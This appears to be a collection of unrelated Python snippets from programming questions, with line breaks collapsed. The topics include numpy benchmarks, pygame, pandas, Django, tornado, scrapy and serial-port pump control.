"import timeimport numpyL , N = 6 , 4shape = ( 2*L ) * [ N , ] A = numpy.arange ( numpy.prod ( shape ) ) .reshape ( shape ) A = A % 256 - 128 # [ -127 , +127 ] axes= ( range ( 1,2*L,2 ) , range ( 0,2*L,2 ) ) def run ( dtype , repeat=1 ) : A_ = A.astype ( dtype ) t = time.time ( ) for i in range ( repeat ) : numpy.tensordot ( A_ , A_ , axes ) t = time.time ( ) - t print ( dtype , ' \t % 8.2f sec\t % 8.2f MB ' % ( t , A_.nbytes/1e6 ) ) run ( numpy.float64 ) run ( numpy.int64 ) L , N = 6 , 4 ; A.size = 4**12 = 16777216 < class 'numpy.float64 ' > 59.58 sec 134.22 MB < class 'numpy.float32 ' > 44.19 sec 67.11 MB < class 'numpy.int16 ' > 711.16 sec 33.55 MB < class 'numpy.int8 ' > 647.40 sec 16.78 MB L , N = 1 , 4**6 ; A.size = ( 4**6 ) **2 = 16777216 < class 'numpy.float64 ' > 57.95 sec 134.22 MB < class 'numpy.float32 ' > 42.84 sec 67.11 MB L , N = 5 , 4 < class 'numpy.float128 ' > 10.91 sec 16.78 MB < class 'numpy.float64 ' > 0.98 sec 8.39 MB < class 'numpy.float32 ' > 0.90 sec 4.19 MB < class 'numpy.float16 ' > 9.80 sec 2.10 MB < class 'numpy.int64 ' > 8.84 sec 8.39 MB < class 'numpy.int32 ' > 5.55 sec 4.19 MB < class 'numpy.int16 ' > 2.23 sec 2.10 MB < class 'numpy.int8 ' > 1.82 sec 1.05 MB < class 'numpy.float128 ' > 17.92 sec 4.10 KB < class 'numpy.float64 ' > 14.20 sec 2.05 KB < class 'numpy.float32 ' > 12.21 sec 1.02 KB < class 'numpy.float16 ' > 41.72 sec 0.51 KB < class 'numpy.int64 ' > 14.21 sec 2.05 KB < class 'numpy.int32 ' > 14.26 sec 1.02 KB < class 'numpy.int16 ' > 13.88 sec 0.51 KB < class 'numpy.int8 ' > 13.03 sec 0.26 KB"
"from sympy.solvers import solve from sympy import Symbol x = Symbol ( ' x ' ) R2 = solve ( -109*x**5/3870720+4157*x**4/1935360-3607*x**3/69120+23069*x**2/60480+5491*x/2520+38-67 , x ) print R2"
"import pygame , random , sys , numpyfrom Flow import Computefrom pygame.locals import *import random , math , sys # from PIL import Imagepygame.init ( ) Surface = pygame.display.set_mode ( ( 1000,600 ) ) # read the airfoil geometry from a dat filewith open ( './resources/naca0012.dat ' ) as file_name : x , y = numpy.loadtxt ( file_name , dtype=float , delimiter='\t ' , unpack=True ) # parameters used to describe the flowNx=30 # 30 column gridNy=10 # 10 row gridN=20 # number of panelsalpha=0 # angle of attacku_inf=1 # freestream velocity # compute the flow fieldu , v , X , Y= Compute ( x , y , N , alpha , u_inf , Nx , Ny ) # The lists used for iterationCircles = [ ] Particles= [ ] Velocities= [ ] # Scaling factors used to properly map the potential flow datapoints into Pygamemagnitude=400vmag=30umag=30panel_x= numpy.multiply ( x , magnitude ) +315panel_y= numpy.multiply ( -y , magnitude ) +308 # build the grid suited for Pygamegrid_x= numpy.multiply ( X , magnitude ) +300grid_y= numpy.multiply ( Y , -1*magnitude ) +300grid_u =numpy.multiply ( u , umag ) grid_v =numpy.multiply ( v , -vmag ) panelcoordinates= zip ( panel_x , panel_y ) # a grid areaclass Circle : def __init__ ( self , xpos , ypos , vx , vy ) : self.radius=16 self.x = xpos self.y = ypos self.speedx = 0 self.speedy = 0 # create the grid listfor i in range ( Ny ) : for s in range ( Nx ) : Circles.append ( Circle ( int ( grid_x [ i ] [ s ] ) , int ( grid_y [ i ] [ s ] ) , grid_u [ i ] [ s ] , grid_v [ i ] [ s ] ) ) Velocities.append ( ( grid_u [ i ] [ s ] , grid_v [ i ] [ s ] ) ) # a particleclass Particle : def __init__ ( self , xpos , ypos , vx , vy ) : self.image = pygame.Surface ( [ 10 , 10 ] ) self.image.fill ( ( 150,0,0 ) ) self.rect = self.image.get_rect ( ) self.width=4 self.height=4 self.radius =2 self.x = xpos self.y = ypos self.speedx = 30 self.speedy = 0 # change particle velocity if collision with grid pointdef CircleCollide ( Circle , Particle ) : Particle.speedx = int ( Velocities [ Circles.index ( ( Circle ) ) ] [ 0 ] ) Particle.speedy = int ( Velocities [ Circles.index ( ( Circle ) ) ] [ 1 ] ) # movement of particlesdef Move ( ) : for Particle in Particles : Particle.x += Particle.speedx Particle.y += Particle.speedy # create particle streak def Spawn ( number_of_particles ) : for i in range ( number_of_particles ) : i=i* ( 300/number_of_particles ) Particles.append ( Particle ( 0 , 160+i,1,0 ) ) # create particles again if particles are out of wakedef Respawn ( number_of_particles ) : for Particle in Particles : if Particle.x > 1100 : Particles.remove ( Particle ) if Particles== [ ] : Spawn ( number_of_particles ) # Collsion detection using pythagoras and distance formuladef CollisionDetect ( ) : for Circle in Circles : for Particle in Particles : if Particle.y > 430 or Particle.y < 160 : Particles.remove ( Particle ) if math.sqrt ( ( ( Circle.x-Particle.x ) **2 ) + ( ( Circle.y-Particle.y ) **2 ) ) < = ( Circle.radius+Particle.radius ) : CircleCollide ( Circle , Particle ) # draw everythingdef Draw ( ) : Surface.fill ( ( 255,255,255 ) ) # Surface.blit ( bg , ( -300 , -83 ) ) for Circle in Circles : pygame.draw.circle ( Surface , ( 245,245,245 ) , ( Circle.x , Circle.y ) , Circle.radius ) for Particle in Particles : pygame.draw.rect ( Surface , ( 150,0,0 ) , ( Particle.x , Particle.y , Particle.width , Particle.height ) ,0 ) # pygame.draw.rect ( Surface , ( 245,245,245 ) , ( Circle.x , Circle.y,1,16 ) ,0 ) for i in range ( len ( panelcoordinates ) -1 ) : pygame.draw.line ( Surface , ( 0,0,0 ) , panelcoordinates [ i ] , panelcoordinates [ i+1 ] ,3 ) pygame.display.flip ( ) def GetInput ( ) : keystate = pygame.key.get_pressed ( ) for event in pygame.event.get ( ) : if event.type == QUIT or keystate [ K_ESCAPE ] : pygame.quit ( ) ; sys.exit ( ) def main ( ) : # bg = pygame.image.load ( `` pressure.png '' ) # bg = pygame.transform.scale ( bg , ( 1600,800 ) ) # thesize= bg.get_rect ( ) # bg= bg.convert ( ) number_of_particles=10 Spawn ( number_of_particles ) clock = pygame.time.Clock ( ) while True : ticks = clock.tick ( 60 ) GetInput ( ) CollisionDetect ( ) Move ( ) Respawn ( number_of_particles ) Draw ( ) if __name__ == '__main__ ' : main ( )"
"import pandas as pdimport numpy as npdf = pd.DataFrame ( { 'int ' : [ 1 , 2 ] , 'float ' : [ np.nan , np.nan ] } ) print ( 'Integer column : ' ) print ( df [ 'int ' ] ) for _ , df_sub in df.groupby ( 'int ' ) : df_sub [ 'float ' ] = float ( df_sub [ 'int ' ] ) df.update ( df_sub ) print ( 'NO integer column : ' ) print ( df [ 'int ' ] )"
"# ! /usr/bin/env pythonfrom __future__ import division , print_functionfrom future_builtins import *import typesimport libui as uifrom PyQt4 import QtCoreimport sipp = ui.QPoint ( ) q = QtCore.QPoint ( ) def _q_getattr ( self , attr ) : print ( `` get % s '' % attr ) value = getattr ( sip.wrapinstance ( self.myself ( ) , QtCore.QPoint ) , attr ) print ( `` get2 % s returned % s '' % ( attr , value ) ) return valuep.__getattr__ = types.MethodType ( _q_getattr , p ) print ( p.__getattr__ ( ' x ' ) ( ) ) # Works ! Prints `` 0 '' print ( p.x ( ) ) # AttributeError : 'QPoint ' object has no attribute ' x '"
"INFO [ alembic.migration ] Context impl PostgresqlImpl.INFO [ alembic.migration ] Will assume transactional DDL.INFO [ alembic.migration ] Running upgrade None - > 19aeffe4063d , empty messageTraceback ( most recent call last ) : File `` manage.py '' , line 13 , in < module > manager.run ( ) ... cursor.execute ( statement , parameters ) sqlalchemy.exc.ProgrammingError : ( ProgrammingError ) relation `` users '' already exists '\nCREATE TABLE users ( \n\tid SERIAL NOT NULL , \n\tusername VARCHAR ( 32 ) , \n\tpassword_hash VARCHAR ( 128 ) , \n\tPRIMARY KEY ( id ) \n ) \n\n ' { } lukas $ heroku run python manage.py db currentRunning ` python manage.py db current ` attached to terminal ... up , run.1401INFO [ alembic.migration ] Context impl PostgresqlImpl.INFO [ alembic.migration ] Will assume transactional DDL.Current revision for postgres : // ... : None web : gunicorn server : appinit : python manage.py db initupgrade : python manage.py db upgrade db = SQLAlchemy ( ) ROLE_USER = 0ROLE_ADMIN = 1class User ( db.Model ) : __tablename__ = `` users '' id = db.Column ( db.Integer , primary_key = True ) username = db.Column ( db.String ( 32 ) , unique = True , index = True ) email = db.Column ( db.String ( 255 ) , unique = True ) password_hash = db.Column ( db.String ( 128 ) ) role = db.Column ( db.SmallInteger , default = ROLE_USER )"
"list= [ 5,1,2,3,6,0,7,1,4 ] evenfirst=lambda x , y:1 if x % 2 > y % 2 else -1 if y % 2 > x % 2 else x-ylist.sort ( cmp=evenfirst ) list == [ 0 , 2 , 4 , 6 , 1 , 1 , 3 , 5 , 7 ] # True list.sort ( key=lambda x : [ x % 2 , x ] )"
> > > for cls in virtual_base_classes ( list ) : > > > print ( cls ) < class 'collections.abc.MutableSequence ' > < class 'collections.abc.Sequence ' > < class 'collections.abc.Sized ' > < class 'collections.abc.Iterable ' > < class 'collections.abc.Container ' >
"DSTC/ st/ __init__.py a.py g.py tb.py dstc.py import inspectimport queueimport threading import functoolsfrom . import a `` C : \Program Files\Python36\python.exe '' C : /Users/user/PycharmProjects/DSTC/st/tb.pyTraceback ( most recent call last ) : File `` C : /Users/user/PycharmProjects/DSTC/st/tb.py '' , line 15 , in < module > from . import aImportError : can not import name ' a'Process finished with exit code 1"
"import functools @ functools.lru_cache ( ) def f ( ) : x = [ 0 , 1 , 2 ] # Stand-in for some long computation return x a = f ( ) a.append ( 3 ) b = f ( ) print ( a ) # [ 0 , 1 , 2 , 3 ] print ( b ) # [ 0 , 1 , 2 , 3 ] a = f ( ) .copy ( ) a.append ( 3 ) b = f ( ) .copy ( ) print ( a ) # [ 0 , 1 , 2 , 3 ] print ( b ) # [ 0 , 1 , 2 ] @ functools.lru_cache ( copy=True ) def f ( ) : ... import functoolsfrom copy import deepcopydef lru_cache ( maxsize=128 , typed=False , copy=False ) : if not copy : return functools.lru_cache ( maxsize , typed ) def decorator ( f ) : cached_func = functools.lru_cache ( maxsize , typed ) ( f ) @ functools.wraps ( f ) def wrapper ( *args , **kwargs ) : return deepcopy ( cached_func ( *args , **kwargs ) ) return wrapper return decorator # Tests below @ lru_cache ( ) def f ( ) : x = [ 0 , 1 , 2 ] # Stand-in for some long computation return xa = f ( ) a.append ( 3 ) b = f ( ) print ( a ) # [ 0 , 1 , 2 , 3 ] print ( b ) # [ 0 , 1 , 2 , 3 ] @ lru_cache ( copy=True ) def f ( ) : x = [ 0 , 1 , 2 ] # Stand-in for some long computation return xa = f ( ) a.append ( 3 ) b = f ( ) print ( a ) # [ 0 , 1 , 2 , 3 ] print ( b ) # [ 0 , 1 , 2 ]"
"crawlerProcess = CrawlerProcess ( settings ) crawlerProcess.install ( ) crawlerProcess.configure ( ) spider = challenges ( start_urls= [ `` http : //www.myUrl.html '' ] ) crawlerProcess.crawl ( spider ) # For now i am just trying to get that bit of code to work but obviously it will become a loop later.dispatcher.connect ( handleSpiderIdle , signals.spider_idle ) log.start ( ) print `` Starting crawler . `` crawlerProcess.start ( ) print `` Crawler stopped . ''"
import scheduledef TestFunction ( ) : passschedule.every ( 1 ) .monday.do ( TestFunction ) schedule.every ( 3 ) .monday.do ( TestFunction ) schedule.run_pending ( )
"ut = np.memmap ( 'my_array.mmap ' , dtype=np.float16 , mode= ' w+ ' , shape= ( 140000,3504 ) ) clf=IncrementalPCA ( copy=False ) X_train=clf.fit_transform ( ut ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` C : \Python27\lib\site-packages\sklearn\base.py '' , line 433 , in fit_transform return self.fit ( X , **fit_params ) .transform ( X ) File `` C : \Python27\lib\site-packages\sklearn\decomposition\incremental_pca.py '' , line 171 , in fit X = check_array ( X , dtype=np.float ) File `` C : \Python27\lib\site-packages\sklearn\utils\validation.py '' , line 347 , in check_array array = np.array ( array , dtype=dtype , order=order , copy=copy ) MemoryError for batch in gen_batches ( n_samples , self.batch_size_ ) : self.partial_fit ( X [ batch ] ) return self temp_train_data=X_train [ 1000 : ] temp_labels=y [ 1000 : ] out = np.empty ( ( 200001 , 3504 ) , np.int64 ) for index , row in enumerate ( temp_train_data ) : actual_index=index+1000 data=X_train [ actual_index-1000 : actual_index+1 ] .ravel ( ) __ , cd_i=pywt.dwt ( data , 'haar ' ) out [ index ] = cd_iout.flush ( ) pca_obj=IncrementalPCA ( ) clf = pca_obj.fit ( out )"
pat = re.compile ( `` ( 1 ( 2 [ 3456 ] +2 ) +1 ) * '' ) to_match= '' 1232112542254211232112322421 ''
import pkg_resourcesdist = pkg_resources.get_distribution ( `` my_project '' ) print ( dist.version )
"ipdb > what=5ipdb > what*** NameError : name 'what ' is not definedwhatelse=6 dir ( ) ipdb > [ 'args ' , 'content_type ' , 'function ' , 'ipdb ' , 'item_code ' , 'kwargs ' , 'object_id ' , 'request ' , 'ud_dict ' , 'update_querydict ' , 'what ' , 'whatelse ' ] what=5ipdb > what5ipdb > whatelse=7ipdb > whatelseipdb > 6whatelseipdb > 7whatelseipdb > 6whatelseipdb > 7"
"[ ( 1 , ' a ' ) , ( 2 , ' b ' ) , ( 2 , ' b ' ) , ( 2 , ' c ' ) , ( 3 , 'd ' ) , ( 2 , ' e ' ) ] [ ( 1 , ' a ' ) , ( 2 , ' b ' ) , ( 3 , 'd ' ) , ( 2 , ' e ' ) ] mylist = [ ... ] for i in range ( len ( mylist ) ) : if mylist [ i-1 ] .attr == mylist [ i ] .attr : mylist.remove ( i )"
< a class= '' G-ab '' href= '' thewebsite.com '' > < div class= '' G-l '' > < div class= '' G-m '' > Product Name < /div > < /div > < div class= '' G-k '' > < div > S $ 230 < /div > < div > Product Description < /div > < div > Used < /div > < /div > < /a > < a class= '' K-ab '' href= '' thewebsite.com '' > < div class= '' K-l '' > < div class= '' K-m '' > Product Name < /div > < /div > < div class= '' K-k '' > < div > S $ 230 < /div > < div > Product Description < /div > < div > Used < /div > < /div > < /a >
"import gcfrom tornado import web , ioloop , genclass MainHandler ( web.RequestHandler ) : @ web.asynchronous @ gen.engine def get ( self ) : gc.collect ( ) print len ( gc.garbage ) # print zombie objects count self.a = '* ' * 500000000 # ~500MB data CHUNK_COUNT = 100 try : for i in xrange ( CHUNK_COUNT ) : self.write ( '* ' * 10000 ) # write ~10KB of data yield gen.Task ( self.flush ) # wait for reciever to recieve print 'finished ' finally : print 'finally'application = web.Application ( [ ( r '' / '' , MainHandler ) , ] ) application.listen ( 8888 ) ioloop.IOLoop.instance ( ) .start ( ) # ! /usr/bin/pythonimport urlliburlopen ( 'http : //127.0.0.1:8888/ ' ) # exit without reading response 0WARNING : root : Write error on 8 : [ Errno 104 ] Connection reset by peer1WARNING : root : Read error on 8 : [ Errno 104 ] Connection reset by peerWARNING : root : error on readTraceback ( most recent call last ) : File `` /usr/local/lib/python2.7/dist-packages/tornado-2.4.1-py2.7.egg/tornado/iostream.py '' , line 361 , in _handle_read if self._read_to_buffer ( ) == 0 : File `` /usr/local/lib/python2.7/dist-packages/tornado-2.4.1-py2.7.egg/tornado/iostream.py '' , line 428 , in _read_to_buffer chunk = self._read_from_socket ( ) File `` /usr/local/lib/python2.7/dist-packages/tornado-2.4.1-py2.7.egg/tornado/iostream.py '' , line 409 , in _read_from_socket chunk = self.socket.recv ( self.read_chunk_size ) error : [ Errno 104 ] Connection reset by peer2ERROR : root : Uncaught exception GET / ( 127.0.0.1 ) HTTPRequest ( protocol='http ' , host='127.0.0.1:8888 ' , method='GET ' , uri='/ ' , version='HTTP/1.0 ' , remote_ip='127.0.0.1 ' , body= '' , headers= { 'Host ' : '127.0.0.1:8888 ' , 'User-Agent ' : 'Python-urllib/1.17 ' } ) Traceback ( most recent call last ) : File `` /usr/local/lib/python2.7/dist-packages/tornado-2.4.1-py2.7.egg/tornado/web.py '' , line 1021 , in _stack_context_handle_exception raise_exc_info ( ( type , value , traceback ) ) File `` /usr/local/lib/python2.7/dist-packages/tornado-2.4.1-py2.7.egg/tornado/web.py '' , line 1139 , in wrapper return method ( self , *args , **kwargs ) File `` /usr/local/lib/python2.7/dist-packages/tornado-2.4.1-py2.7.egg/tornado/gen.py '' , line 120 , in wrapper runner.run ( ) File `` /usr/local/lib/python2.7/dist-packages/tornado-2.4.1-py2.7.egg/tornado/gen.py '' , line 345 , in run yielded = self.gen.send ( next ) File `` test.py '' , line 10 , in get self.a = '* ' * 500000000MemoryErrorERROR : root:500 GET / ( 127.0.0.1 ) 3.91ms"
"# allData is a 64x256x913 arrayall_experiment_trials = [ ] for trial in range ( allData.shape [ 2 ] ) : all_trial_electrodes = [ ] for electrode in range ( allData.shape [ 0 ] ) : for other_electrode in range ( allData.shape [ 0 ] ) : if electrode == other_electrode : pass else : single_xcorr = max ( np.correlate ( allData [ electrode , : , trial ] , allData [ other_electrode , : , trial ] , `` full '' ) ) all_trial_electrodes.append ( single_xcorr ) all_experiment_trials.append ( all_trial_electrodes )"
> > > float ( ' A ' ) ValueError : could not convert string to float : A > > > float ( ' A ' ) ValueError : não é possível converter a string para um float : A
"lookback = 20 # height -- timeseriesn_features = 5 # width -- features at each timestep # Build an LSTM to perform regression on time series input/output datamodel = Sequential ( ) model.add ( LSTM ( units=256 , return_sequences=True , input_shape= ( lookback , n_features ) ) ) model.add ( Activation ( 'elu ' ) ) model.add ( LSTM ( units=256 , return_sequences=True ) ) model.add ( Activation ( 'elu ' ) ) model.add ( LSTM ( units=256 ) ) model.add ( Activation ( 'elu ' ) ) model.add ( Dense ( units=1 , activation='linear ' ) ) model.compile ( optimizer='adam ' , loss='mean_squared_error ' ) model.fit ( X_train , y_train , epochs=50 , batch_size=64 , validation_data= ( X_val , y_val ) , verbose=1 , shuffle=True ) prediction = model.predict ( X_test ) lookback = 20 # height -- timeseriesn_features = 5 # width -- features at each timestep model = Sequential ( ) model.add ( Conv2D ( 128 , 3 , activation='elu ' , input_shape= ( lookback , n_features , 1 ) ) ) model.add ( MaxPool2D ( ) ) model.add ( Conv2D ( 128 , 3 , activation='elu ' ) ) model.add ( MaxPool2D ( ) ) model.add ( Flatten ( ) ) model.add ( Dense ( 1 , activation='linear ' ) ) model.compile ( optimizer='adam ' , loss='mean_squared_error ' ) model.fit ( X_train , y_train , epochs=50 , batch_size=64 , validation_data= ( X_val , y_val ) , verbose=1 , shuffle=True ) prediction = model.predict ( X_test )"
"list = [ ( 1 , ' q ' ) , ( 6 , ' w ' ) , ( 3 , ' e ' ) , ( 4 , ' r ' ) ] if item in heap : heap.remove ( item ) Pushheap ( item , num ) else : Pushheap ( item , num )"
import pandas as pd print ( 'pandas : version { } '.format ( pd.__version__ ) ) import matplotlib.pyplot as plt from sklearn.metrics import confusion_matrix
"subtractList ( [ ' a ' , ' b ' , ' c ' , 'd ' ] , [ ' x ' , ' y ' , ' z ' ] ) = [ ' a ' , ' b ' , ' c ' , 'd ' ] subtractList ( [ 1,2,3,4,5 ] , [ 2 , 4 ] ) = [ 1 , 3 , 5 ] subtractList ( range ( 5 ) , range ( 4 ) ) def subtractList ( list1 , list2 ) : list1 = list ( list1 ) list2 = list ( list2 ) for i in list1 : if i in list2 : list1.remove ( i ) return list1 def subtractList ( list1 , list2 ) : new_list = [ ] list1 = list ( list1 ) list2 = list ( list2 ) for i in list1 : if i not in list2 : new_list.append ( i ) return new_list"
"├── app│ ├── Country│ │ └── views.py│ ├── Customer│ │ └── views.py from app.Country.views import * ... . > > > from rope.base.project import Project > > > > > > proj = Project ( 'app ' ) > > > > > > Country = proj.get_folder ( 'Country ' ) > > > > > > from rope.refactor.rename import Rename > > > > > > change = Rename ( proj , Country ) .get_changes ( 'Countries ' ) > > > proj.do ( change ) from app.Country.views import *"
"attributes = { 'first_name ' : None , 'last_name ' : None , 'calls ' : 0 } accounts = defaultdict ( lambda : attributes ) accounts [ 1 ] [ 'calls ' ] = accounts [ 1 ] [ 'calls ' ] + 1accounts [ 2 ] [ 'calls ' ] = accounts [ 2 ] [ 'calls ' ] + 1print accounts [ 1 ] [ 'calls ' ] # prints 2print accounts [ 2 ] [ 'calls ' ] # prints 2"
"# ! /usr/bin/env python # -*- encoding : utf-8 -*- import requests import grequests def SingleRequest ( ) : rs = requests.get ( `` www.example.com '' ) return rs def MultiRequest ( ) : urls = [ `` www.example1.com '' , `` www.example2.com '' , `` www.example3.com '' ] rs = [ grequests.get ( u ) for u in urls ] rs_map = grequests.map ( rs ) ; return rs_map ; Exception Type : RecursionErrorException Value : maximum recursion depth exceededException Location : /usr/local/lib/python3.6/ssl.py in options , line 459/usr/local/lib/python3.6/ssl.py in options super ( SSLContext , SSLContext ) .options.__set__ ( self , value ) X 100 times ..."
from pathlib import Pathprint ( list ( Path ( ' a/b/c/d ' ) .parents ) [ -2 ] ) p = Path ( ' a/b/c/d ' ) print ( p.parents [ len ( p.parents ) - 2 ] )
"import matplotlib.pyplot as pltfrom pandas_datareader import dataAMZ = data.DataReader ( 'AMZN ' , start='2011 ' , end='2018 ' , data_source='yahoo ' ) AMZ = AMZ [ 'Close ' ] AMZ.plot ( ) AMZ.resample ( 'BA ' ) .mean ( ) .plot ( style= ' : ' ) AMZ.asfreq ( 'BA ' ) .plot ( style= ' -- ' ) plt.show ( )"
"# ! /usr/bin/env python2.7 # ... if ( opts.foo or opts.bar or opts.baz ) is None : # ( actual option names changed to protect the guilty ) sys.stderr.write ( `` Some error messages that these are required arguments '' ) # ! /usr/bin/env python2.7 if None in ( opts.foo , opts.bar , opts.baz ) : # ..."
"from PyQt5 import QtWidgets , uicclass Window ( QtWidgets.QMainWindow , uic.loadUiType ( 'design.ui ' ) [ 0 ] ) : def __init__ ( self ) : super ( ) .__init__ ( ) self.setupUi ( self ) print ( self.label.text ( ) ) app = QtWidgets.QApplication ( [ ] ) window = Window ( ) window.show ( ) app.exec_ ( ) < ? xml version= '' 1.0 '' encoding= '' UTF-8 '' ? > < ui version= '' 4.0 '' > < class > MainWindow < /class > < widget class= '' QMainWindow '' name= '' MainWindow '' > < widget class= '' QWidget '' name= '' centralwidget '' > < widget class= '' QLabel '' name= '' label '' > < property name= '' text '' > < string > Hi , Qt. < /string > < /property > < /widget > < /widget > < /widget > < /ui >"
"> > > import re > > > re.finditer ( `` \d+ '' , `` 1 ha 2 bah '' ) .__class__ < type 'callable-iterator ' > > > > iter ( [ 1 , 2 ] ) .__class__ < type 'listiterator ' > > > > iter ( `` hurm '' ) .__class__ < type 'iterator ' >"
"s = '1234'partitions ( s ) # - > [ [ ' 1 ' , ' 2 ' , ' 3 ' , ' 4 ' ] , [ ' 1 ' , ' 2 ' , '34 ' ] , [ ' 1 ' , '23 ' , ' 4 ' ] # [ '12 ' , ' 3 ' , ' 4 ' ] , [ '12 ' , '34 ' ] , [ ' 1 ' , '234 ' ] , [ '123 ' , ' 4 ' ] ] # should not contain [ '1234 ' ] from itertools import permutationss = '1234'permutations ( s ) # returns [ ' 1 ' , ' 2 ' , ' 3 ' , ' 4 ' ] , [ ' 1 ' , ' 2 ' , ' 4 ' , ' 3 ' ] ..."
"> > > uneven = [ [ 1 ] , [ 47 , 17 , 2 , 3 ] , [ 3 ] , [ 12 , 5 , 75 , 33 ] ] > > > [ ( 1 , 47 , 3 , 12 ) , ( 1 , 17 , 3 , 5 ) , ( 1 , 2 , 3 , 75 ) , ( 1 , 3 , 3 , 33 ) ] > > > maxlist = len ( max ( *uneven , key=len ) ) > > > maxlist4 > > > from itertools import repeat > > > uneven2 = [ x if len ( x ) == maxlist else repeat ( x [ 0 ] , maxlist ) for x in uneven ] > > > uneven2 [ [ 1 , 1 , 1 , 1 ] , [ 47 , 17 , 2 , 3 ] , [ 3 , 3 , 3 , 3 ] , [ 12 , 5 , 75 , 33 ] ] > > > zip ( *uneven2 ) [ ( 1 , 47 , 3 , 12 ) , ( 1 , 17 , 3 , 5 ) , ( 1 , 2 , 3 , 75 ) , ( 1 , 3 , 3 , 33 ) ]"
from string import Templatetempl = Template ( 'hello $ { name } ' ) print templ.substitute ( name='world ' ) print templ.substitute ( ) print templ.substitute ( ) > > hello name
"a = set ( [ 'this ' , 'is ' , 'an ' , 'apple ! ' ] ) b = set ( [ 'apple ' , 'orange ' ] ) c = a.intersection ( b )"
"` title ` ` status ` Titanic WIPAvatar WIPTerminator CompleteAbyss Default Abyss / DefaultAvatar / WIPTitanic / WIPTerminator / Complete Title.objects.order_by ( status='Default ' , status='WIP ' , status='Complete ' , title )"
"for line in fileinput.FileInput ( files=gzipped_files , openhook=fileinput.hook_compressed ) : ValueError : FileInput opening mode must be one of ' r ' , 'rU ' , ' U ' and 'rb '"
"> > > type ( list.append ) , list.append ( < class 'method_descriptor ' > , < method 'append ' of 'list ' objects > ) > > > type ( list.__add__ ) , list.__add__ ( < class 'wrapper_descriptor ' > , < slot wrapper '__add__ ' of 'list ' objects > ) > > > import types > > > type ( list.append ) in vars ( types ) .values ( ) False > > > type ( list.__add__ ) in vars ( types ) .values ( ) False > > > help ( type ( list.append ) ) Help on class method_descriptor in module builtins : class method_descriptor ( object ) | Methods defined here : | < generic descriptions for > __call__ , __get__ , __getattribute__ , __reduce__ , and __repr__ | | -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- | Data descriptors defined here : | | __objclass__ | | __text_signature__ > > > help ( type ( list.__add__ ) ) Help on class wrapper_descriptor in module builtins : class wrapper_descriptor ( object ) | Methods defined here : | < generic descriptions for > __call__ , __get__ , __getattribute__ , __reduce__ , and __repr__ | | -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- | Data descriptors defined here : | | __objclass__ | | __text_signature__"
"from django import templatedef render ( templ , **args ) : `` '' '' Convenience function to render a template with ` args ` as the context . The rendered template is normalized to 1 space between 'words'. `` '' '' try : t = template.Template ( templ ) out_text = t.render ( template.Context ( args ) ) normalized = ' '.join ( out_text.split ( ) ) except template.TemplateSyntaxError as e : normalized = str ( e ) return normalizeddef test_unknown_tag ( ) : txt = render ( `` '' '' a { % b % } c `` '' '' ) assert txt == `` Invalid block tag : ' b ' '' def test_missing_value ( ) : txt = render ( `` '' '' a { { b } } c `` '' '' ) assert txt == `` ? '' def test_missing_close_tag ( ) : txt = render ( `` '' '' a { % b c `` '' '' ) assert txt == `` ? `` def test_missing_close_value ( ) : txt = render ( `` '' '' a { { b c `` '' '' ) assert txt == `` ? ''"
"import timeimport serial # configure the serial connections ( the parameters differs on the device you are connecting to ) ser = serial.Serial ( port='/dev/tty.USA19H142P1.1 ' , # /dev/tty.KeySerial1 ? baudrate=19200 , parity=serial.PARITY_NONE , stopbits=serial.STOPBITS_ONE , bytesize=serial.EIGHTBITS ) if not ser.isOpen ( ) : ser.open ( ) print sercommands = [ 'dia26.59 ' , 'phn01 ' , 'funrat ' , 'rat15mm ' , 'vol0.7 ' , 'dirinf ' , 'phn02 ' , 'funrat ' , 'rat7.5mm ' , 'vol.5 ' , 'dirinf ' , 'phn03 ' , 'funrat ' , 'rat15mm ' , 'vol0.7 ' , 'dirwdr ' , 'phn04 ' , 'funstp ' , 'dia26.59 ' , 'phn01 ' , 'funrat ' , 'rat15mm ' , 'vol1.0 ' , 'dirinf ' , 'phn02 ' , 'funrat ' , 'rat7.5mm ' , 'vol.5 ' , 'dirinf ' , 'phn03 ' , 'funrat ' , 'rat15mm ' , 'vol1.0 ' , 'dirwdr ' , 'phn04 ' , 'funstp ' ] for cmd in commands : print cmd ser.write ( cmd + '\r ' ) time.sleep ( 1 ) out = `` while ser.inWaiting ( ) > 0 : out += ser.read ( 1 ) if out ! = `` : print ' > > ' + out $ ls -lt /dev/tty* | headcrw -- w -- -- 1 nathann tty 16 , 0 Oct 13 14:13 /dev/ttys000crw-rw-rw- 1 root wheel 31 , 6 Oct 13 14:12 /dev/tty.KeySerial1crw-rw-rw- 1 root wheel 31 , 8 Oct 13 13:52 /dev/tty.USA19H142P1.1crw-rw-rw- 1 root wheel 2 , 0 Oct 13 10:00 /dev/ttycrw-rw-rw- 1 root wheel 31 , 4 Oct 12 11:34 /dev/tty.Bluetooth-Incoming-Portcrw-rw-rw- 1 root wheel 4 , 0 Oct 12 11:34 /dev/ttyp0crw-rw-rw- 1 root wheel 4 , 1 Oct 12 11:34 /dev/ttyp1crw-rw-rw- 1 root wheel 4 , 2 Oct 12 11:34 /dev/ttyp2crw-rw-rw- 1 root wheel 4 , 3 Oct 12 11:34 /dev/ttyp3crw-rw-rw- 1 root wheel 4 , 4 Oct 12 11:34 /dev/ttyp4 ( sweetcrave ) nathann @ glitch sweetcrave ( master ) $ python pumptest.pySerial < id=0x1093af290 , open=True > ( port='/dev/tty.USA19H142P1.1 ' , baudrate=19200 , bytesize=7 , parity= ' O ' , stopbits=2 , timeout=None , xonxoff=False , rtscts=False , dsrdtr=False ) dia26.59 > > phn01funratrat15mmvol0.7^CTraceback ( most recent call last ) : File `` pumptest.py '' , line 28 , in < module > time.sleep ( 1 ) KeyboardInterrupt"
